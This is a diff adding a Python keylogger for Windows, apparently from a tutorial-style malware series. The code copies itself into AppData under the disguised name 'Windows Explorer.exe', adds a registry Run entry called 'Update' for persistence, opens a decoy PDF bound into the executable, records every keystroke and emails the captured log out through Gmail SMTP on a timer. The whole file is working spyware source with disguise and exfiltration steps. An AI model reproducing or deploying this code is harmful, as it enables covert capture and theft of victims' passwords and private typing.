@@ -1,0 +1,73 @@
+
+#codebloack 7
+
+#!/usr/bin/env python
+# encoding=utf8
+import pynput.keyboard
+import threading
+import smtplib
+import os
+# os commands support
+import sys
+# to copy our file to different location
+import shutil
+# to copy our file to different location
+import subprocess
+# to add entry in Windows registry
+
+log = ""
+
+class Keylogger:
+    def __init__(self, time_interval, email, password):
+        self.system_boot()
+        #initialisee method
+        self.log = "Keylogger Started..."
+        self.interval = time_interval
+        self.email = email
+        self.password = password
+
+    def system_boot(self):
+        keylogger_file_location = os.environ["AppData"] + "\\Windows Explorer.exe"
+        # first we get to know our users location and then copy our executable to that location with a different name to look less suspicious
+        if not os.path.exists(keylogger_file_location):
+            shutil.copyfile(sys.executable, keylogger_file_location)
+            # if our keylogger is not available on that location, then copy it
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Update /t REG_SZ /d "' + keylogger_file_location + '"', shell=True)
+            # once the keylogger is copied, add an entry to the registry along with its location so that it will be invoked after every system reboot
+            os.chdir(sys._MEIPASS)
+            #since we'll be converting our .py to .exe while binding a pdf, on double clicking the .exe, the pdf will be extracted to this location
+            os.system('data_files\\sample.pdf')
+            #this is the location of our pdf
+
+    def append_to_log(self, string):
+        self.log = self.log + string
+
+    def process_key_press(self, key):
+        try:
+            current_key = str(key.char)
+        except AttributeError:
+            if key == key.space:
+                current_key = " "
+            else:
+                current_key = " " + str(key) + " "
+        self.append_to_log(current_key)
+
+    def report(self):
+        print(self.log)
+        self.send_mail(self.email, self.password, " " + self.log)
+        self.log = ""
+        timer = threading.Timer(self.interval, self.report)
+        timer.start()
+
+    def send_mail(self, email, password, message):
+        server = smtplib.SMTP("smtp.gmail.com", 587)
+        server.starttls()
+        server.login(email, password)
+        server.sendmail(email, email, message)
+        server.quit()
+
+    def start(self):
+        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
+        with keyboard_listener:
+            self.report()
+            keyboard_listener.join()
